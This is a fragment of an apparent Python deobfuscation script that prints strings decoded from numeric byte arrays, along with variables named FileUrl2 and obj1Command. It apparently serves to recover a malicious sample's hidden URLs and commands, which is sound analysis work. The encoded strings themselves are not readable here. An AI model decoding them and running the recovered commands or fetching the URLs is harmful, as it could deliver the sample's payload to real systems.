...
print("2: "+FileUrl2)
print("3: "+obj1Command)
print("4: "+arrToStr([74, 128, 173], 89))
print("5: "+arrToStr([204, 174], 92) + arrToStr([80, 230, 185, 231, 27, 2, 1, 166, 162, 145], 94))
print("6: "+arrToStr([254, 205, 102, 31, 235, 93, 164, 177, 116, 147, 0, 143, 232, 96], 104) + arrToStr([165, 240, 148, 143, 238, 107, 33, 249, 87, 202, 145, 197, 106, 58], 118))
print("7: "+arrToStr([179, 240, 86, 249, 147, 195, 49, 202, 142, 102, 103, 201, 59, 206], 132) + arrToStr([59, 173, 216], 146))
print("8: "+arrToStr([233, 58, 86], 149))
print("9: "+arrToStr([8, 157, 17, 113, 152, 38], 152) + arrToStr([49, 218, 245, 178, 84, 117], 158))
print("10: "+arrToStr([121, 36, 188, 224, 247, 214], 164) + arrToStr([136, 136, 204, 194, 118, 250, 245, 202, 27, 248, 176, 122, 118, 155, 230, 46, 137, 34, 144, 125, 31, 152, 228, 146, 34, 95, 199, 54, 202, 203, 105, 250, 46, 78], 170))
print("11: "+arrToStr([117, 44, 204, 11, 35, 222, 143, 40, 222, 167, 241, 108, 12, 66, 198, 222, 185, 220, 66, 157, 209, 56, 155, 152, 7], 204) + arrToStr([126, 188, 254, 57, 247, 53, 250, 41, 160, 73, 23, 196, 34, 122, 170, 182, 204, 240, 116, 10, 129, 214, 181, 75, 72, 167, 206, 241, 177, 24, 55, 130, 183, 51], 229))
print("12: "+arrToStr([144, 139, 51, 186, 32, 81, 100, 111, 217, 11, 17, 250], 263) + arrToStr([149], 275))
print("13: "+arrToStr([149, 98, 218, 73, 249, 32, 48, 205, 229, 119, 69, 236, 185], 276) + arrToStr([16, 4, 3, 101, 182, 232, 25, 100, 134, 36, 137, 159, 194, 190, 46, 62, 60, 143, 33, 126, 183], 289))
print("14: "+arrToStr([253, 131, 239, 226, 230, 125, 86, 121, 207, 39, 234, 233, 38, 228, 156, 50, 146, 203, 72, 88, 21, 204, 56, 59, 78, 102, 89, 7], 310) + arrToStr([248, 7, 125, 249, 201, 5, 171, 158, 118, 239, 47, 141, 80, 91, 208, 48, 238, 18], 338))
